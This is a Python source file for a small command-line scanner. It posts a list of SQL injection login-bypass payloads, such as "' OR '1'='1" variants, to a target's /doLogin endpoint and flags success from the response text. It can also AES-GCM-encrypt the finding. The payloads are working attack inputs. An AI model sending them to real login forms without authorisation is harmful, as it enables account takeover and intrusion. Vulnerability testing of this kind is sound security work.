import os
import requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import argparse
from hashlib import sha256


# Test for login bypass vulnerabilities using SQL injection
def test_login_bypass(url, login_endpoint):
    # List of SQL injection payloads to test with
    # Source: https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        '" OR "1"="1',
        "' OR 1=1 --",
        "' OR 1=1 #",
        "') OR ('1'='1",
    ]

    # Flag to indicate if a vulnerability is found
    vulnerable = False

    # Iterate over each payload to test the login endpoint
    for payload in payloads:
        # Construct login data with the payload
        data = {
            "uid": payload,
            # Placeholder password
            "passw": "anyPassword",
        }
        try:
            # Send POST request to the login endpoint with the payload
            response = requests.post(login_endpoint, data=data)
            # Check if response indicates a possible SQL injection vulnerability
            if (
                "Welcome" in response.text
                or "syntax error" in response.text
                or "SQL" in response.text
                or response.status_code == 500
            ):
                print(
                    f"Potential SQL Injection vulnerability found with payload '{payload}'"
                )
                # Mark as vulnerable and exit loop
                vulnerable = True
                break
        except requests.exceptions.RequestException as e:
            # Price network request exceptions
            print(f"Request failed: {e}")
            continue

    if not vulnerable:
        # If no vulnerabilities found
        print("No SQL Injection vulnerabilities detected.")
    return vulnerable


# Convert a word (used as encryption seed) to a fixed-length key
def convert_word_to_key(word):
    # Hash the word using SHA-256 to ensure a consistent length (32 bytes)
    hash_bytes = sha256(word.encode()).digest()
    # Use a 32-byte slice (256 bits) for key generation for AES-GCM
    return hash_bytes[:32]


# Encrypt sensitive data using AES-GCM with the given key
def encrypt_sensitive_data(data, key):
    # Generate a random 12-byte nonce (required by AES-GCM)
    nonce = os.urandom(12)
    aesgcm = AESGCM(key)
    # Encrypt the data with AES-GCM (no associated data)
    encrypted = aesgcm.encrypt(nonce, data.encode(), None)
    # Return the nonce and the encrypted data
    return nonce, encrypted


# Main function to scan the target URL for SQL injection vulnerabilities
def scan_vulnerabilities(target_url, encryption_key_word=None):
    # Define the login endpoint to test SQL injection against
    login_endpoint = target_url + "/doLogin"
    print(f"Scanning {login_endpoint} for vulnerabilities...")
    # Check if the login endpoint is vulnerable
    is_vulnerable = test_login_bypass(target_url, login_endpoint)

    if encryption_key_word:
        # If an encryption keyword is provided, generate an encryption key
        key = convert_word_to_key(encryption_key_word)
        if is_vulnerable:
            # If a vulnerability was detected, encrypt the information
            nonce, encrypted_vulnerability_info = encrypt_sensitive_data(
                "SQL Injection", key
            )
            # Display nonce and encrypted data (concatenated)
            print(
                f"Encrypted Information (nonce + ciphertext): {nonce + encrypted_vulnerability_info}"
            )


if __name__ == "__main__":
    # Set up command-line argument parsing
    parser = argparse.ArgumentParser(description="Scan target URL for vulnerabilities.")
    # Argument for target URL
    parser.add_argument("target_url", type=str, help="URL of the target to scan.")
    # User can provide a keyword to generate an encryption key
    parser.add_argument(
        "--encryption_key_word",
        type=str,
        help="Optional word to generate an encryption key for securing data.",
        default=None,
    )

    # Parse the arguments from the command line
    args = parser.parse_args()
    # Call the main scanning function with the provided arguments
    scan_vulnerabilities(args.target_url, args.encryption_key_word)
